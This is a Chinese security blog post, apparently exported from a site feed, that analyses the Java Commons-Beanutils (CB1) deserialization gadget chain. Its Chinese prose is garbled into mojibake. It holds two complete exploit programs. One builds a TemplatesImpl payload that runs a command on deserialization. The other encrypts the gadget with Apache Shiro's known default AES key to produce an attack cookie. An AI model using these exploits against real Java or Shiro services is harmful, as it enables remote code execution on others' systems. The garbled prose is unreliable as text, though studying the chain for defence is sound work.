        <content type="html"><![CDATA[<h2 id="java-cbé“¾"><a href="#java-cbé“¾" class="headerlink" title="java cbé“¾"></a>java cbé“¾</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥ç”¨mavenæ­å»ºä¸€ä¸ªç®€æ˜“çš„ç¯å¢ƒä¸»è¦æ˜¯ç”¨æ¥è®°å½•ä¸€ä¸‹</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å…ˆæ¥å†™ä¸€ä¸ªdemoçœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">demo</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">demo</span> <span class="variable">zbz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo</span>(<span class="string">&quot;zbz&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(zbz, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">        System.out.println(zbz.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºæ˜¯ä¸€æ ·çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778237899-aedf4ac8-9dba-40f8-99bf-35d10377785a.png"></p><p>è¿™é‡Œå¼•ç”¨å…¶ä»–å¸ˆå‚…çš„ä»‹ç»</p><p>åœ¨ CB ä¸­æœ‰ä¸ªå·¥å…·ç±»å«PropertyUtilsï¼Œå®ƒå¯ä»¥å¯¹ javaBean è¿›è¡Œä¸€äº›æ“ä½œ</p><p>PropertyUtilsç±»ä¸‹æä¾›äº†ä¸€äº›é™æ€æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿å¼€å‘è€…ç›´æ¥è°ƒç”¨ä¸€äº›getterå’Œsetteræ–¹æ³•ï¼š</p><p>getPropertyï¼šè¿”å›æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼</p><p>getSimplePropertyï¼šè¿”å›æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼</p><p>setPropertyï¼šè®¾ç½®æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼</p><p>setSimplePropertyï¼šè®¾ç½®æŒ‡å®šBeançš„æŒ‡å®šå±æ€§çš„å€¼</p><p>è¿™é‡Œcbé“¾çš„é—®é¢˜ä¸»è¦æ˜¯å‡ºç°åœ¨è¿™ä¸ªæ–¹æ³•ä¸­æˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778405999-f5637048-8910-46b4-9595-6320ca294495.png"></p><p>ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778420187-4d5775bd-853b-4c73-ad7c-65bd16f9240a.png"></p><p>ç»§ç»­æ¥ç€è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778610024-c8ff7088-7fa6-4b4c-bad7-147b30deadfa.png"></p><p>è¿›åˆ°getNestedPropertyç±»ï¼Œç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778660361-a4b7a70d-8a49-4034-8429-5480a69aea8c.png"></p><p>è·Ÿè¿›è¿™ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724778791831-91234bad-359f-43e4-a946-68a0f5bc8a55.png"></p><p>è·Ÿåˆ°è¿™é‡Œç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779111312-f6d7d943-d388-4261-a92e-b674457bfbb7.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¼ å…¥çš„æ˜¯ name ï¼Œè¿™é‡Œè¿”å› Bean å±æ€§å€¼æ˜¯ Name ï¼Œå¹¶ä¸” set æ–¹æ³•ä¸ get æ–¹æ³•éƒ½æ˜¯ setName , getName ï¼Œè¿™æ˜¯ JavaBean çš„å‘½åæ ¼å¼ï¼Œä¼šå°†ä¼ è¿›æ¥çš„å°å†™é¦–å­—æ¯å¤§å†™å…³äºjavaBeançš„ä¸€äº›çŸ¥è¯†<a href="%5Bhttps://www.cnblogs.com/jyroy/p/11102298.html#:~:text%5D(https://www.cnblogs.com/jyroy/p/11102298.html#:~:text">ä»€ä¹ˆæ˜¯JavaBeanï¼Ÿ - JYRoy - åšå®¢å›­ (cnblogs.com)</a>&#x3D; JavaBeansæ˜¯Javaä¸­ä¸€ç§ç‰¹æ®Šçš„ç±»ï¼Œå¯ä»¥å°†å¤šä¸ªå¯¹è±¡å°è£…åˆ°ä¸€ä¸ªå¯¹è±¡ï¼ˆbeanï¼‰ä¸­ã€‚,ç‰¹ç‚¹æ˜¯å¯åºåˆ—åŒ–ï¼Œæä¾›æ— å‚æ„é€ å™¨ï¼Œæä¾›getteræ–¹æ³•å’Œsetteræ–¹æ³•è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚ åç§°ä¸­çš„â€œBeanâ€æ˜¯ç”¨äºJavaçš„å¯é‡ç”¨è½¯ä»¶ç»„ä»¶çš„æƒ¯ç”¨å«æ³•ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779227248-f2debeaf-2a44-479d-93ca-6a2872c272c9.png"></p><p>åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™éƒ¨åˆ†å¾ˆåƒåå°„è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779277688-c2db2e00-3ead-4e35-bb1a-231557e821e3.png"></p><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯åˆ©ç”¨äº†åå°„è°ƒç”¨å¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥æ€»ç»“ä¸€ä¸‹ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡PropertyUtils.getProperty(zbz, â€œnameâ€); çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¿™ä¸ª<br>æ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„getterã€‚</p><p>ç„¶ååé¢å°±æ˜¯ä¸Templatesé“¾çš„ç»“åˆä½¿ç”¨ï¼Œå…·ä½“å¯ä»¥å‚è€ƒcc3 cc4çœ‹çœ‹templatesçš„åŸç†è°ƒç”¨è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»</p><p>ä¸»è¦ä»‹ç»ä¸ºä»€ä¹ˆä¼šç»“åˆè¿™ä¸ªtemplatesè¿™ä¸ªç±»ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºç»“è®ºå°±æ˜¯<code>**getOutputProperties()**</code>æ–¹æ³•å³å…¶ _outputProperties å±æ€§çš„ getter æ–¹æ³•æ˜¯åŠ è½½æ¶æ„å­—èŠ‚ç çš„èµ·ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ å‰é¢æåˆ°çš„ï¼Œcommons-beanutilsé‡Œçš„<code>**PropertyUtils.getProperty()**</code>å»è°ƒç”¨getterã€‚é‚£ä¹ˆå¾€ä¸Šæ‰¾é“¾å­ï¼ŒCBé“¾é‡Œ å“ªä¸ªä½ç½®è°ƒç”¨äº†<code>**getProperty**</code>å‘¢ï¼Ÿ</p><p>åœ¨ä¹‹å‰çš„CC2&#x2F;4çš„é“¾ä¸­æˆ‘ä»¬ç”¨åˆ°äº†<code>**java.util.PriorityQueue**</code>çš„readObjectè§¦å‘ååºåˆ—åŒ–ï¼Œä¸»è¦æ˜¯é€šè¿‡è°ƒç”¨äº†å…¶<code>**TransformingComparator**</code>çš„compareæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨äº†transformé“¾çš„è°ƒç”¨</p><p>è€Œ CommonsBeanutils åˆ©ç”¨é“¾ä¸­æ ¸å¿ƒçš„è§¦å‘ä½ç½®å°±æ˜¯ <code>**BeanComparator.compare()**</code> å‡½æ•°ï¼Œå½“è°ƒç”¨ <code>**BeanComparator.compare()**</code> å‡½æ•°æ—¶ï¼Œå…¶å†…éƒ¨ä¼šè°ƒç”¨æˆ‘ä»¬å‰é¢è¯´çš„ <code>**getProperty**</code> å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨ JavaBean ä¸­å¯¹åº”å±æ€§çš„ getter å‡½æ•°ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724779913758-45432ec3-2439-4577-b2b0-7fdf7f5e9631.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨<code>**PropertyUtils.getProperty()**</code>æ–¹æ³• å› æ­¤é€šè¿‡ç»™ o1èµ‹å€¼æ„é€ å¥½çš„templateså¯¹è±¡ï¼Œpropertyèµ‹å€¼ä¸ºTemplatesImplçš„ outputPropertieså±æ€§ï¼Œå³å¯è°ƒç”¨ <code>**TemplatesImpl.getOutputProperties()**</code> å¾€ä¸‹å°±æ˜¯TemplatesImplçš„åˆ©ç”¨é“¾ã€‚é‚£ä¹ˆå¾€ä¸Šæ‰¾ å“ªé‡Œè°ƒç”¨ compare()å‘¢ å¯ä»¥åˆ©ç”¨CC2&#x2F;4é“¾ä¸­ç”¨çš„ <code>**PriorityQueue.readObject()**</code><strong>å…·ä½“å¯ä»¥å‚è€ƒè‡ªå·±å†™çš„cc2è®²è§£äº†å¦‚ä½•è°ƒç”¨çš„compareæ–¹æ³•ä»¥åŠcomparatorä¹Ÿå¯ä»¥æ§åˆ¶ã€‚</strong></p><p>å‰é¢çš„<a href="https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/">CC2é“¾</a>æ–‡ç« æåˆ°äº†ï¼Œqueueçš„sizeåº”è¯¥å¤§äºç­‰äº2ï¼Œè€Œadd()ä¹Ÿä¼šæ‰§è¡Œcompareï¼Œç”±äºåœ¨BeanComparatorçš„compare()æ–¹æ³•ä¸­ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚è¿™é‡Œå®é™…ä¸Šå°±æ˜¯å¯¹1ã€2è¿›è¡Œæ’åºã€‚æ‰€ä»¥åœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬addä»»æ„å€¼ï¼Œç„¶ååˆ©ç”¨åå°„ä¿®æ”¹æˆæ¶æ„TemplateImpl å¯¹è±¡</p><p>ç»™å‡ºexp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">payload</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;CB1&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ— ä¾èµ–æ‰“shiro"><a href="#æ— ä¾èµ–æ‰“shiro" class="headerlink" title="æ— ä¾èµ–æ‰“shiro"></a>æ— ä¾èµ–æ‰“shiro</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1724782115685-9fa08452-14c4-4e98-8755-8fc19bf43b66.png"></p><p>åœ¨<code>BeanComparator</code>ç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥<code>Comparator</code>çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ <code>ComparableComparator</code> ã€‚</p><p>æ—¢ç„¶æ­¤æ—¶æ²¡æœ‰ComparableComparator ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥æ›¿æ¢ï¼Œå®ƒæ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ï¼š</p><ul><li>å®ç° java.util.Comparatoræ¥å£</li><li>å®ç°java.io.Serializableæ¥å£</li><li>Javaã€shiroæˆ–commons-beanutilsè‡ªå¸¦</li></ul><p><code>CaseInsensitiveComparator</code>ç±»æ˜¯<code>java.lang.String</code>ç±»ä¸‹çš„ä¸€ä¸ªå†…éƒ¨ç§æœ‰ç±»ï¼Œå…¶å®ç°äº† <code>Comparator</code>å’Œ<code>Serializable</code>ï¼Œä¸”ä½äºJavaçš„æ ¸å¿ƒä»£ç </p><p>é€šè¿‡<code>String.CASE_INSENSITIVE_ORDER</code> å³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„<code>CaseInsensitiveComparator</code>å¯¹è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ– <code>BeanComparator</code></p><p>æ‰€ä»¥exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">pq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">//        System.out.println(barr);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line"><span class="comment">//        Object o = (Object)ois.readObject();</span></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/gk0d/p/16889963.html">https://www.cnblogs.com/gk0d/p/16889963.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> cbé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collectionsååºåˆ—åŒ–æ±‡æ€»</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/</url>
      
